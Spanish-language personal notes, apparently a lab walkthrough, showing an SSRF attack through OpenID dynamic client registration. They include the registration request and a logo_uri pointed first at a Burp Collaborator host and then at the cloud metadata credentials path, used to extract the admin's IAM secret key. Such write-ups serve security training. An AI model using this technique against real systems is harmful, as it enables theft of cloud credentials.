![[Pasted image 20230417145109.png]]

hacer login con social media:

![[Pasted image 20230417145420.png]]

![[Pasted image 20230417145449.png]]

busco un endpoint con GET/auth mas algo más:

![[Pasted image 20230417145607.png]]

copio el host y armo el siguiente url:

oauth-0ac4006103cb5153831f7cf202a000e5.oauth-server.net

https://oauth-0ac4006103cb5153831f7cf202a000e5.oauth-server.net/.well-known/openid-configuration

esto lo pego en una pestaña nueva:

![[Pasted image 20230417145845.png]]

como tuve respuesta entiendo que este esquema es el que espero explotar; en esencia aqui tengo toda la info de los endpoints que intervienen en el handshake. En el repeater escribo el siguiente codigo:

POST /reg HTTP/1.1
Host: oauth-0ac4006103cb5153831f7cf202a000e5.oauth-server.net
Content-Type: application/json

{
"redirect-uris": [
  "https://example.com"]
}

y presiono Send, me aparecerá la siguiente ventana donde vuelvo a poner el Host así como tambien confirmo la operación en el puerto 443:

![[Pasted image 20230417150505.png]]

vuelvo a presionar Send y obtengo:

![[Pasted image 20230417150648.png]]

por qué obtuve la respuesta 400? notese que en la primera figura usé guión normal siendo lo correcto el guión bajo:

![[Pasted image 20230417150828.png]]

![[Pasted image 20230417150848.png]]

ahora que obtuvimos un status 201 vemos que en el objeto hay info sensible:

![[Pasted image 20230417150954.png]]

esto mismo hay que obtener del admin. Me vuelvo al history y busco un endpoint GET con el formato /client/xxx/logo:

![[Pasted image 20230417151151.png]]

lo mando al repeater y cargo el burp collaborator client, en este voy a copiar la dirección y en mi primer script hago esta modificación:
nmd5oo7wm23fye9dpjvzqljs7jd91y.oastify.com

![[Pasted image 20230417151519.png]]

presiono Send y tengo que obtener otro status 201:

![[Pasted image 20230417151555.png]]

copio el client id del request obtenido:

![[Pasted image 20230417151657.png]]

"client_id":"qTFsGZoFvm424sJQ1YNKY",

luego me paso a la segunda traza que tengo en el repeater (la del logo) y sustituyo el client_id por el que acabo de obtener:

![[Pasted image 20230417151841.png]]

GET /client/kynmi2f2w1f592au3f17x/logo

por:
GET /client/qTFsGZoFvm424sJQ1YNKY/logo

![[Pasted image 20230417152005.png]]

y le doy send:

![[Pasted image 20230417152034.png]]

como obtuve un status 200 entonces seguidamente pongo a trabajar el burp collaborator:

![[Pasted image 20230417152236.png]]

de hecho, mi sorpresa fue que las trazas las obtuve sin necesidad del boton poll now, verificando el request HTTP:

![[Pasted image 20230417152339.png]]

Ahora, siguiendo las indicaciones del laboratorio entonces en mi script sustituyo el logo uri con el link que me da el lab:

http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/

presiono send y debería obtener un status 201:

![[Pasted image 20230417152632.png]]

![[Pasted image 20230417152718.png]]

este client_id lo copio: 
"client_id":"tanqzYbXxBRhbhmIw6BJi",

me paso a la segunda traza y sustituyo este id:

![[Pasted image 20230417152850.png]]


al darle send:

![[Pasted image 20230417152945.png]]

obtengo todas las credenciales del admin:

![[Pasted image 20230417153012.png]]

el secretAccessKey lo copio y lo envío como solucion:

![[Pasted image 20230417153131.png]]

![[Pasted image 20230417153150.png]]

